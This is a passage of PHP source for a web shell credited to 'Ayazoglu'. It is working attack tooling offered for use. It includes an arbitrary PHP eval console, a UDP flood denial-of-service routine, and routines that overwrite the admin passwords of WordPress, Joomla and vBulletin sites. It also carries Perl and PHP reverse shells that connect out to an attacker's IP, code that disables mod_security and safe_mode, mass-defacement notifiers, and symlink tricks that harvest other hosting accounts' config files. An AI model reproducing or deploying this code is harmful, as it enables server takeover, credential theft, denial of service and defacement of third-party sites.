	if(empty($_POST['ajax']) && !empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
    echo '<div class=header><Center><a href=# onclick="g(\'phpeval\',null,\'\',\'ini\')">| INI_INFO | </a><a href=# onclick="g(\'phpeval\',null,\'\',\'info\')">    | phpinfo |</a><a href=# onclick="g(\'phpeval\',null,\'\',\'exten\')">   | extensions  |</a></center><br><form name=pf method=post onsubmit="g(\'phpeval\',null,this.code.value,\'\'); return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><center><input type=submit value=Eval style="margin-top:5px"></center>';
	echo '</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
	if(!empty($_POST['p1'])) {
		ob_start();
		eval($_POST['p1']);
		echo htmlspecialchars(ob_get_clean());
	}
	echo '</pre></div>';
  
    madfooter();
}

function madhash()
{
    if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
    if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
	if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
	if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));return strtoupper($r);}}
	if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
	$stringTools = array(
		'Base64 encode' => 'base64_encode',
		'Base64 decode' => 'base64_decode',
        'md5 hash' => 'md5',
		'sha1 hash' => 'sha1',
		'crypt' => 'crypt',
		'CRC32' => 'crc32',
		'Url encode' => 'urlencode',
		'Url decode' => 'urldecode',
		'Full urlencode' => 'full_urlencode',
		'Htmlspecialchars' => 'htmlspecialchars',
		
	);
	
	madhead();
	echo '<div class=header>';
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
	echo "<form  onSubmit='g(null,null,this.selectTool.value,this.input.value); return false;'><select name='selectTool'>";
	foreach($stringTools as $k => $v)
		echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
		echo "</select><input type='submit' value='>>'/><br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
	if(!empty($_POST['p1'])) {
		if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));
	}
	echo "</div>";
	madFooter();
    
}
@$dos = $_GET['dos'];
if($dos=="run"){

        $packets=0;
		ignore_user_abort(true);	

		$host = @$_GET['host'];
		$exec_time =$_GET['time'];
		$portudp = @$_GET['port'];
	
        $time=time();
        $max_time=$exec_time+$time;
        
        
        for($i=0;$i<65000;$i++)
        {
            $out .= 'X';
        }
        while(1){
    
         $packets++;
            if(time() > $max_time){
                    break;
            }
            
            $fp = fsockopen('udp://'.$host, $portudp, $errno, $errstr, 5);
            if($fp){
                    fwrite($fp, $out);
                    fclose($fp);
            }
            }
         echo "$packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second";
         echo "</pre>";
 
}

function madwp(){
    madhead();
  echo '<div class=header>';
  echo '<center><span>| AUTO WORDPRESS ADMIN |</span><br><br>
  <form onSubmit="g(null,null,this.db.value,this.user.value,this.pass.value); return false;" method="POST">
  <span>Database :</span><input name="db" type="text" size="15" /><span>User :</span><input name="user" type="text" size="10" /><span>Password</span> : <input name="pass" type="text" size="10" /> 
  <input  type="submit" value=">>" /></form></center>';
  echo "<pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' >";
  if($_POST){
  $wphash = '$P$BvuhipxyQv/SPYT.4Z4jvWJBiZJ9xc1';
  $joomhash = '1da26ec883fe2576d1dc8ab9733a4e57:ngkzZmWcriw5ZAjzo0Qcm56gnrh5b9J4';
  $db = $_POST['p1'];
  $user = $_POST['p2'];
  $pass = $_POST['p3'];
  if($db==""||$user==""){
  $db="forum";
  $user="root";
  }else{
  mysql_connect("localhost","$user","$pass");
  mysql_select_db("$db");
  
  $sor = mysql_query("select * from wp_users order by id ASC limit 1");
  echo mysql_error();
  $sonuc = mysql_fetch_array($sor);
  $adminid = $sonuc['ID'];
  $admin = $sonuc['user_login'];
  $guncelle = mysql_query("update wp_users set user_pass = '$wphash' where ID='$adminid'");
  if($guncelle){
  echo 'Completed.... WP-ADMIN : '.$admin.'  | WP-PASSWORD : ayaz';
  }else{
  echo mysql_error();
  }
  }
  }
  echo '</div>';	
  madfooter();
}

function madjoom(){
  madhead();
  echo '<div class=header>';
  echo '<center><span>| AUTO JOOMLA ADMIN |</span><br><br>
  <form onSubmit="g(null,null,this.db.value,this.user.value,this.pass.value); return false;" method="POST">
  <span>Database :</span><input name="db" type="text" size="15" /><span>User :</span><input name="user" type="text" size="10" /><span>Password</span> : <input name="pass" type="text" size="10" /> 
  <input  type="submit" value=">>" /></form></center>';
  echo "<pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' >";
  if($_POST){
  $wphash = '$P$BvuhipxyQv/SPYT.4Z4jvWJBiZJ9xc1';
  $joomhash = '1da26ec883fe2576d1dc8ab9733a4e57:ngkzZmWcriw5ZAjzo0Qcm56gnrh5b9J4';
  $db = $_POST['p1'];
  $user = $_POST['p2'];
  $pass = $_POST['p3'];
  if($db==""||$user==""){
  $db="forum";
  $user="root";
  }else{
  mysql_connect("localhost","$user","$pass");
  mysql_select_db("$db");
  
  $sor = mysql_query("select * from jos_users order by id ASC limit 1");
  echo mysql_error();
  $sonuc = mysql_fetch_array($sor);
  $adminid = $sonuc['id'];
  $admin = $sonuc['username'];
  $guncelle = mysql_query("update jos_users set password = '$joomhash' where id='$adminid'");
  if($guncelle){
  echo 'Completed.... JOOMLA-ADMIN : '.$admin.'  | JOOMLA-PASSWORD : ayaz';
  }else{
  echo mysql_error();
  }
  }
  }
  echo '</div>';	
  madfooter();
}


function madvb(){
  madhead();
  echo '<div class=header>';
  echo '<center><span>| AUTO VBULLETIN ADMIN |</span><br><br>
  <form onSubmit="g(null,null,this.db.value,this.user.value,this.pass.value); return false;" method="POST">
  <span>Database :</span><input name="db" type="text" size="15" /><span>User :</span><input name="user" type="text" size="10" /><span>Password</span> : <input name="pass" type="text" size="10" /> 
  <input  type="submit" value=">>" /></form></center>';
  echo "<pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' >";
  if($_POST){
  $wphash = '$P$BvuhipxyQv/SPYT.4Z4jvWJBiZJ9xc1';
  $joomhash = '1da26ec883fe2576d1dc8ab9733a4e57:ngkzZmWcriw5ZAjzo0Qcm56gnrh5b9J4';
  $vbhash='993f1ee9036ff67b576ab9d00651f306';
  $db = $_POST['p1'];
  $user = $_POST['p2'];
  $pass = $_POST['p3'];
  if($db==""||$user==""){
  $db="forum";
  $user="root";
  }else{
  mysql_connect("localhost","$user","$pass");
  mysql_select_db("$db");
  
  $sor = mysql_query("select * from user order by userid ASC limit 1");
  echo mysql_error();
  $sonuc = mysql_fetch_array($sor);
  $adminid = $sonuc['id'];
  $admin = $sonuc['username'];
  $guncelle = mysql_query("UPDATE user SET password = MD5(CONCAT(MD5('ayaz'), salt)) WHERE userid = '$adminid'");
  if($guncelle){
  echo 'Completed.... vBulletin-ADMIN : '.$admin.'  | vBulletin-PASSWORD : ayaz';
  }else{
  echo mysql_error();
  }
  }
  }
  echo '</div>';	
  madfooter();
}

function madautoadmin()
{
    madhead();
	
	   echo '<div class=header><script>p1_=p2_=p3_="";</script><br><center><h3><a href=# onclick="g(\'wp\',null,\'wp\',null)">| Wordpress | </a><a href=# onclick="g(\'joom\',null,null,\'joom\')">| Joomla | </a><a href=# onclick="g(\'vb\',null,null,null,\'vb\')">| vBulletin | </a></h3></center>';
 
  echo '</div>'; 
 
  madfooter();        
}
function maddos()
{
    madhead();
    echo '<div class=header>';
  if(empty($_POST['ajax'])&&!empty($_POST['p1']))
  $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
  echo '<center><span>| UDP DOSSIER |</span><br><br>
  <form onSubmit="g(null,null,this.udphost.value,this.udptime.value,this.udpport.value); return false;" method=POST><span>Host :</span><input name="udphost" type="text"  size="25" /><span>Time :</span><input name="udptime" type="text" size="15" /><span>Port :</span><input name="udpport" type="text" size="10" /><input  type="submit" value=">>" /></form></center>';
  echo "<pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' >";
    if(!empty($_POST['p1']) && !empty($_POST['p2']) && !empty($_POST['p3']))
    {
        $packets=0;
		ignore_user_abort(true);	
       
        $exec_time=$_POST['p2'];
		$host=$_POST['p1'];
		$portudp=$_POST['p3'];
	
        $time=time();
        $max_time=$exec_time+$time;
        
        
        for($i=0;$i<65000;$i++)
        {
            $out .= 'X';
        }
        while(1){
    
         $packets++;
            if(time() > $max_time){
                    break;
            }
            
            $fp = fsockopen('udp://'.$host, $portudp, $errno, $errstr, 5);
            if($fp){
                    fwrite($fp, $out);
                    fclose($fp);
            }
            }
         echo "$packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second";
         echo "</pre>";
    }
    
    echo '</div>'; 
   
    madfooter();        
}

function madproc()
{
    madhead();
    echo "<Div class=header><center>";
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
  $_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
  if($GLOBALS['sys']=="win")
  {
    $process=array(
    "System Info" =>"systeminfo",
    "Active Connections" => "netstat -an",
 	"Running Services" => "net start",
 	"User Accounts" => "net user",
 	"Show Computers" => "net view",
    "ARP Table" => "arp -a",
    "IP Configuration" => "ipconfig /all"
    );
    }
  else
  { 
    $process=array(
    "Process status" => "ps aux",
    "Syslog" =>"cat  /etc/syslog.conf",
    "Resolv" => "cat  /etc/resolv.conf",
    "Hosts" =>"cat /etc/hosts",
    "Passwd" =>"cat /etc/passwd",
    "Cpuinfo"=>"cat /proc/cpuinfo",
    "Version"=>"cat /proc/version",
    "Sbin"=>"ls -al /usr/sbin",
    "Interrupts"=>"cat /proc/interrupts",
    "lsattr"=>"lsattr -va",
    "Uptime"=>"uptime",
    "Fstab" =>"cat /etc/fstab",
    "HDD Space" => "df -h"
    );}
    
    foreach($process as $n => $link)
    {
        echo '<a href="#" onclick="g(null,null,\''.$link.'\')"> | '.$n.' | </a>';
    }
    echo "</center>"; 
     if(!empty($_POST['p1']))
     {
        echo "<pre class='ml1' style='margin-top:5px' >";
        echo madEx($_POST['p1']);
        echo '</pre>';
     }
     echo "</div>";
     madfooter();
     }
     
function madsafe()
{
    madhead();
    echo "<div class=header><center><h3><span>| SAFE MODE AND MOD SECURITY DISABLED AND PERL 500 INTERNAL ERROR BYPASS |</span></h3>Following php.ini and .htaccess(mod) and perl(.htaccess)[convert perl extention *.pl => *.sh  ] files create in following dir<br>| ".$GLOBALS['cwd']." |<br>";
    echo '<a href=# onclick="g(null,null,\'php.ini\',null)">| PHP.INI | </a><a href=# onclick="g(null,null,null,\'ini\')">| .htaccess(Mod) | </a><a href=# onclick="g(null,null,null,null,\'sh\')">| .htaccess(perl) | </a></center>';
    if(!empty($_POST['p2']) && isset($_POST['p2']))
    {
    $fil=fopen($GLOBALS['cwd'].".htaccess","w");
    fwrite($fil,'<IfModule mod_security.c>
Sec------Engine Off
Sec------ScanPOST Off
</IfModule>');
    fclose($fil);
   }
   if(!empty($_POST['p1'])&& isset($_POST['p1']))
   {
    $fil=fopen($GLOBALS['cwd']."php.ini","w");
      fwrite($fil,'safe_mode=OFF
disable_functions=NONE');
     fclose($fil);
    }
    if(!empty($_POST['p3']) && isset($_POST['p3']))
    {
    $fil=fopen($GLOBALS['cwd'].".htaccess","w");
    fwrite($fil,'Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .sh
AddHandler cgi-script .pl
AddHandler cgi-script .pl');
     fclose($fil); 
    }
    echo "<br></div>";
    madfooter();
    
}

function madconnect()
{
 madhead();
 $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
 echo "<div class=header><center><h3><span>| PERL AND PHP(threads) BACK CONNECT |</span></h3>";
 echo "<form  onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\"><span>PERL BACK CONNECT</span><br>IP: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='443'> <input type=submit value='>>'></form>";
 echo "<br><form  onSubmit=\"g(null,null,'php',this.server.value,this.port.value);return false;\"><span>PHP BACK CONNECT</span><br>IP: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='443'> <input type=submit value='>>'></form></center>";
 if(isset($_POST['p1'])) {
		function cf($f,$t) {
			$w = @fopen($f,"w") or @function_exists('file_put_contents');
			if($w){
				@fwrite($w,@base64_decode($t));
				@fclose($w);
			}
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$out = madEx("perl /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." 1>/dev/null 2>&1 &");
			echo "<pre class=ml1 style='margin-top:5px'>Successfully opened reverse shell to ".$_POST['p2'].":".$_POST['p3']."<br>Connecting...</pre>";
            @unlink("/tmp/bc.pl");
		}
        if($_POST['p1']=='php')
 {
            
@set_time_limit (0);
$ip = $_POST['p2']; 
$port =$_POST['p3'];     
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
echo "<pre class=ml1 style='margin-top:5px'>";

if (function_exists('pcntl_fork')) {
	
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		echo "Cant fork!<br>";
		exit(1);
	}
	
	if ($pid) {
		exit(0);  
	}

	if (posix_setsid() == -1) {
		echo "Error: Can't setsid()<br>";
		exit(1);
	}

	$daemon = 1;
} else {
	echo "WARNING: Failed to daemonise.  This is quite common and not fatal<br>";
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	echo "$errstr ($errno)";
	exit(1);
}


$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"),  
   2 => array("pipe", "w")   
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	echo "ERROR: Can't spawn shell<br>";
	exit(1);
}


@stream_set_blocking($pipes[0], 0);
@stream_set_blocking($pipes[1], 0);
@stream_set_blocking($pipes[2], 0);
@stream_set_blocking($sock, 0);

echo "Successfully opened reverse shell to $ip:$port<br>";

while (1) {
	if (feof($sock)) {
		echo "ERROR: Shell connection terminated<br>";
		break;
	}

	if (feof($pipes[1])) {
		echo "ERROR: Shell process terminated<br>";
		break;
	}

	
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets=@stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) echo "SOCK READ<br>";
		$input=fread($sock, $chunk_size);
		if ($debug) echo "SOCK: $input<br>";
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) echo "STDOUT READ<br>";
		$input = fread($pipes[1], $chunk_size);
		if ($debug) echo "STDOUT: $input<br>";
		fwrite($sock, $input);
	}

	
	if (in_array($pipes[2], $read_a)) {
		if ($debug) echo "STDERR READ<br>";
		$input = fread($pipes[2], $chunk_size);
		if ($debug) echo "STDERR: $input<br>";
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

echo "</pre>";
}

}   
 echo "</div>";
 madfooter();
}

function golgeler($url, $hacker, $site )
{
	$k = curl_init();
	$surl = ''.$url.'?hacker='.$hacker.'&domain='.$site.'';
	curl_setopt($k, CURLOPT_URL, $surl);
	curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
	$kubra = curl_exec($k);
	curl_close($k);
	return $kubra;
}
function madgolgeler()
{
    madhead();
    if(!function_exists('curl_version'))
    {
        echo "<pre class=ml1 style='margin-top:5px'><center><font color=red>PHP CURL NOT EXIT</font></center></pre>";
    }
    echo "<div class=header><center><br>";
    echo '<h3><span>|GOLGELER.NET MASS DEFACER |</span></h3>
    <form  onSubmit="g(null,null,this.defacer.value,this.domain.value);return false;" >
    <span>| Notifier |</span><br>
<input type="text" name=defacer size="40" value="Attacker" /><br>
<textarea name=domain cols="50" rows="15">List Of Domains</textarea>
<br>
<input type="submit" value=">>" /></form>';
if(isset($_POST['p1']) && isset($_POST['p2']))
{
    $hacker =$_POST['p1'];
    $site =$_POST['p2'];
    $neden ="Not available";
   $i = 0;
   $sites = explode("\n", $site);
   echo "<pre class=ml1 style='margin-top:5px'>";
	while($i < count($sites)) 
	{
	if(substr($sites[$i], 0, 4) != "http") 
	{
			$sites[$i] = "http://".$sites[$i];
	}
	golgeler("http://golgeler.net/mass.php", $hacker, $sites[$i]);
	echo "Site : ".$sites[$i]." Defaced !<br>";
	++$i;
	}
     
    "Sending Sites To Golgeler.Net Has Been Completed Successfully !! </pre>";
}
echo "</div>";
madfooter();
    
}

function ZoneH($url, $hacker, $hackmode,$reson, $site )
{
	$k = curl_init();
	curl_setopt($k, CURLOPT_URL, $url);
	curl_setopt($k,CURLOPT_POST,true);
	curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
	curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
	$kubra = curl_exec($k);
	curl_close($k);
	return $kubra;
}
function madzoneh()
{
    madhead();
    if(!function_exists('curl_version'))
    {
        echo "<pre class=ml1 style='margin-top:5px'><center><font color=red>PHP CURL NOT EXIT</font></center></pre>";
    }
    echo "<div class=header><center><br>";
    echo '<h3><span>|ZONE-H MASS DEFACER |</span></h3>
    <form  onSubmit="g(null,null,this.defacer.value,this.hackmode.value,this.domain.value);return false;" >
    <span>| Notifier |</span><br>
<input type="text" name=defacer size="40" value="Attacker" /><br>
<select name=hackmode>
<option >--------SELECT--------</option>
<option value="1">known vulnerability (i.e. unpatched system)</option>
<option value="2" >undisclosed (new) vulnerability</option>
<option value="3" >configuration / admin. mistake</option>
<option value="4" >brute force attack</option>
<option value="5" >social engineering</option>
<option value="6" >Web Server intrusion</option>
<option value="7" >Web Server external module intrusion</option>
<option value="8" >Mail Server intrusion</option>
<option value="9" >FTP Server intrusion</option>
<option value="10" >SSH Server intrusion</option>
<option value="11" >Telnet Server intrusion</option>
<option value="12" >RPC Server intrusion</option>
<option value="13" >Shares misconfiguration</option>
<option value="14" >Other Server intrusion</option>
<option value="15" >SQL Injection</option>
<option value="16" >URL Poisoning</option>
<option value="17" >File Inclusion</option>
<option value="18" >Other Web Application bug</option>
<option value="19" >Remote administrative panel access bruteforcing</option>
<option value="20" >Remote administrative panel access password guessing</option>
<option value="21" >Remote administrative panel access social engineering</option>
<option value="22" >Attack against administrator(password stealing/sniffing)</option>
<option value="23" >Access credentials through Man In the Middle attack</option>
<option value="24" >Remote service password guessing</option>
<option value="25" >Remote service password bruteforce</option>
<option value="26" >Rerouting after attacking the Firewall</option>
<option value="27" >Rerouting after attacking the Router</option>
<option value="28" >DNS attack through social engineering</option>
<option value="29" >DNS attack through cache poisoning</option>
<option value="30" >Not available</option>
</select><br>
<select  >
<option >Not available</option>
<option value="1" >Heh...just for fun!</option>
<option value="2" >Revenge against that website</option>
<option value="3" >Political reasons</option>
<option value="4" >As a challenge</option>
<option value="5" >I just want to be the best defacer</option>
<option value="6" >Patriotism</option>
<option value="7" >Not available</option>
</select><br>
<textarea name=domain cols="50" rows="15">List Of Domains</textarea>
<br>
<input type="submit" value=">>" /></form>';
if(isset($_POST['p1']) && isset($_POST['p2']))
{
    $hacker =$_POST['p1'];
    $method =$_POST['p2'];
    $neden ="Not available";
    $site =$_POST['p3'];
   $i = 0;
   $sites = explode("\n", $site);
   echo "<pre class=ml1 style='margin-top:5px'>";
	while($i < count($sites)) 
	{
	if(substr($sites[$i], 0, 4) != "http") 
	{
			$sites[$i] = "http://".$sites[$i];
	}
	ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
	echo "Site : ".$sites[$i]." Defaced !<br>";
	++$i;
	}
     
    "Sending Sites To Zone-H Has Been Completed Successfully !! </pre>";
}
echo "</div>";
madfooter();
    
}
function madspot()
{
    madhead();
    echo "<div class=header>";
    echo "<pre>
    
                           |`-:_
  ,----....____            |    `+.                                                           
 (             ````----....|___   |
  \     _                      ````----....____
   \    _)  Coded By: Ayazoglu                ```---.._                       
    \                                                   \ 
  )`.\  )`.   )`.   )`.   )`.   )`.   )`.   )`.   )`.   )`.   )hh
-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `-'   `
   Ayazoglu is a Team of professional Ethical Hackers From Turkey.
   We have Years of  Experience in  Security, Penetration & Coding 
   And can Break and Secure.
   
   Version 1.1
   
   Contact : http://www.ayazoglu.org
 
   if you found bug contact our team 
   
   


              .=''=.             
             / _  _ \
            |  d  b  |
            \   /\   / 
           ,/'-=\/=-'\,
          / /        \ \     -----------------------------
         | / Ayaz     \ |    Ayazoglu Digital Security Team
         \/ \  Oglu  / \/    -----------------------------
             '.    .'
             _|`~~`|_
             /|\  /|\    
	
       .- <O> -.        .-====-.      ,-------.      .-=<>=-.
   /_-\'''/-_\      / / '' \ \     |,-----.|     /__----__\
  |/  o) (o  \|    | | ')(' | |   /,'-----'.\   |/ (')(') \|
   \   ._.   /      \ \    / /   {_/(') (')\_}   \   __   /
   ,>-_,,,_-<.       >'=jf='<     `.   _   .'    ,'--__--'.
 / Mario      \    /        \     /'-___-'\    /    :|    \
(_)           (_)  /  Atess   \   / RainMan \  (_)   :|   (_)
 \_-----'____--/  (_)        (_) (_)_______(_)   |___:|____|
  \___________/     |________|     \_______/     | sLayEr  |


	
  
  
    </pre></div>";
    madfooter();
    
    }
    
function madsymlink()
{
    madhead();
    
$IIIIIIIIIIIl = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$IIIIIIIIIII1=explode('/',$IIIIIIIIIIIl );
$IIIIIIIIIIIl =str_replace($IIIIIIIIIII1[count($IIIIIIIIIII1)-1],'',$IIIIIIIIIIIl );  
    
    
    

   echo '<div class=header><script>p1_=p2_=p3_="";</script><br><center><h3><a href=# onclick="g(\'symlink\',null,\'website\',null)">| Domains | </a><a href=# onclick="g(\'symlink\',null,null,\'whole\')">| Whole Server Symlink | </a><a href=# onclick="g(\'symlink\',null,null,null,\'config\')">| Config PHP symlink | </a></h3></center>';
    
    if(isset($_POST['p1']) && $_POST['p1']=='website')
    {
        echo "<center>";
        $d0mains = @file("/etc/named.conf");
        if(!$d0mains){ echo "<pre class=ml1 style='margin-top:5px'>Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; }

 

echo "<table align=center class='main'  border=0  >

<tr bgcolor=Red><td>Count</td><td>domains</td><td>users</td></tr>";
$count=1;
foreach($d0mains as $d0main){

if(@eregi("zone",$d0main)){

preg_match_all('#zone "(.*)"#', $d0main, $domains);

flush();

if(strlen(trim($domains[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));

echo "<tr><td>".$count."</td><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>"; flush();
$count++;
}}}
echo "</center></table>"; 
 }
 
 if(isset($_POST['p2']) && $_POST['p2']=='whole')
 {
    
    
    @set_time_limit(0);
    
    echo "<center>";
    
  
        
@mkdir('sym',0777);
$IIIIIIIIIIl1  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$IIIIIIIIII1I =@fopen ('sym/.htaccess','w');
fwrite($IIIIIIIIII1I ,$IIIIIIIIIIl1);
@symlink('/','sym/root');
$IIIIIIIIIlIl = basename('_FILE_');
    
    
$IIIIIIIIIllI = @file('/etc/named.conf');
if(!$IIIIIIIIIllI)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<table align='center' width='40%' class='main'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($IIIIIIIIIllI as $IIIIIIIIIll1){
if(@eregi('zone',$IIIIIIIIIll1)){
preg_match_all('#zone "(.*)"#',$IIIIIIIIIll1,$IIIIIIIIIl11);
flush();
if(strlen(trim($IIIIIIIIIl11[1][0])) >2){
$IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/'.$IIIIIIIIIl11[1][0]));
$IIIIIIII1I1l = $IIIIIIIII1I1['name'] ;
@symlink('/','sym/root');
$IIIIIIII1I1l = $IIIIIIIIIl11[1][0];
$IIIIIIII1I11 = '\.ir';
$IIIIIIII1lII = '\.il';
if (@eregi("$IIIIIIII1I11",$IIIIIIIIIl11[1][0]) or @eregi("$IIIIIIII1lII",$IIIIIIIIIl11[1][0]) )
{
$IIIIIIII1I1l = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$IIIIIIIIIl11[1][0].'</div>';
}
echo "
<tr>

<td>
<a target='_blank' href=http://www.".$IIIIIIIIIl11[1][0].'/>'.$IIIIIIII1I1l.' </a>
</td>

<td>
'.$IIIIIIIII1I1['name']."
</td>

<td>
<a href='sym/root/home/".$IIIIIIIII1I1['name']."/public_html' target='_blank'>symlink </a>
</td>


</tr>";
flush();
}
}
}
}
    
echo "</center></table>";    
    
 }
 
 
 
 if(isset($_POST['p3']) && $_POST['p3']=='config')
 
 
 {
  echo "<center>";
@mkdir('sym',0777);
$IIIIIIIIIIl1  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$IIIIIIIIII1I =@fopen ('sym/.htaccess','w');
@fwrite($IIIIIIIIII1I ,$IIIIIIIIIIl1);
@symlink('/','sym/root');
$IIIIIIIIIlIl = basename('_FILE_');
  
   
   $IIIIIIIIIllI = @file('/etc/named.conf');
if(!$IIIIIIIIIllI)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
}
else
{
echo "
<table align='center' width='40%' class='main' ><td> Domains </td><td> Script </td>";
foreach($IIIIIIIIIllI as $IIIIIIIIIll1){
if(@eregi('zone',$IIIIIIIIIll1)){
preg_match_all('#zone "(.*)"#',$IIIIIIIIIll1,$IIIIIIIIIl11);
flush();
if(strlen(trim($IIIIIIIIIl11[1][0])) >2){
$IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/'.$IIIIIIIIIl11[1][0]));
$IIIIIIIII1l1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/wp-config.php';
$IIIIIIIII11I=get_headers($IIIIIIIII1l1);
$IIIIIIIII11l=$IIIIIIIII11I[0];
$IIIIIIIII111=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/blog/wp-config.php';
$IIIIIIIIlIII=get_headers($IIIIIIIII111);
$IIIIIIIIlIIl=$IIIIIIIIlIII[0];
$IIIIIIIIlII1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/configuration.php';
$IIIIIIIIlIlI=get_headers($IIIIIIIIlII1);
$IIIIIIIIlIll=$IIIIIIIIlIlI[0];
$IIIIIIIIlIl1=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/joomla/configuration.php';
$IIIIIIIIlI1I=get_headers($IIIIIIIIlIl1);
$IIIIIIIIlI1l=$IIIIIIIIlI1I[0];
$IIIIIIIIlI11=$IIIIIIIIIIIl.'/sym/root/home/'.$IIIIIIIII1I1['name'].'/public_html/includes/config.php';
$IIIIIIIIllII=get_headers($IIIIIIIIlI11);
$IIIIIIIIllIl=$IIIIIIIIllII[0];
